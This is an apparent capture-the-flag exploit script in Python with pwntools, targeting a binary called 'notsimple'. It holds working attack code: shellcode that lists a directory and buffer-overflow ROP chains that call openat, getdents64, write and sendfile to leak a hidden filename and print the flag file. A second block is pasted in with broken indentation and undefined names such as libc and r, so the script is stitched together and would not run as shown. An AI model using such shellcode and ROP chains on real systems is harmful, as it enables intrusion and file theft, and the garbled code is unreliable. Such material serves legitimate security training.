from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')

# p = process('./notsimple')
# p = gdb.debug('./notsimple','b *main')

# openat()

# AT_FDCWD = -100

#payload = b''
#payload += asm(shellcraft.openat(AT_FDCWD))
#payload += asm(shellcraft.getdents(3, 'rsp', 0x20))
#payload += asm(shellcraft.write(1, AT_FDCWD, 0x20))

payload = b''
payload += asm(shellcraft.open('.'))
payload += asm(shellcraft.getdents(3, 'rsp', 0x20))
payload += asm(shellcraft.write(1, 'rsp', 0x20))


# openat(/pwn) + getdents + write to leak filename
    # 716b228a42da0c8b248c9e2f801f2c6f.txt
    chain_leakfilename = b"A"*72 + pop_rsi_r15 
    chain_leakfilename += p64(0xbeef0000100) 
    chain_leakfilename += p64(0) 
    chain_leakfilename += p64(libc.sym.openat) 
    chain_leakfilename += pop_rdi 
    chain_leakfilename += p64(3) 
    chain_leakfilename += pop_rsi_r15 
    chain_leakfilename += p64(0xbeef0000000) 
    chain_leakfilename += p64(0) 
    chain_leakfilename += pop_rdx_rcx_rbx 
    chain_leakfilename += p64(1000) 
    chain_leakfilename += p64(0)*2 
    chain_leakfilename += p64(libc.sym.getdents64) 
    chain_leakfilename += pop_rdi 
    chain_leakfilename += p64(1) 
    chain_leakfilename += pop_rsi_r15 
    chain_leakfilename += p64(0xbeef0000000) 
    chain_leakfilename += p64(0) 
    chain_leakfilename += pop_rdx_rcx_rbx 
    chain_leakfilename += p64(1000) 
    chain_leakfilename += p64(0)*2 
    chain_leakfilename += p64(libc.sym.write)

    # openat(/pwn/716b228a42da0c8b248c9e2f801f2c6f.txt) + sendfile to read flag
    chain_printflag = b"A"*72 + pop_rsi_r15 + p64(0xbeef0000100) + p64(0) + p64(libc.sym.openat) + \
    pop_rdi + p64(1) + pop_rsi_r15 + p64(3) + p64(0) + pop_rdx_rcx_rbx +  p64(0) + p64(100) + p64(0) + p64(libc.sym.sendfile)

    r.sendlineafter(b"Exploiting BOF is simple right? ;)\n", chain_printflag)

    r.interactive()


p.sendline(payload)
p.interactive()
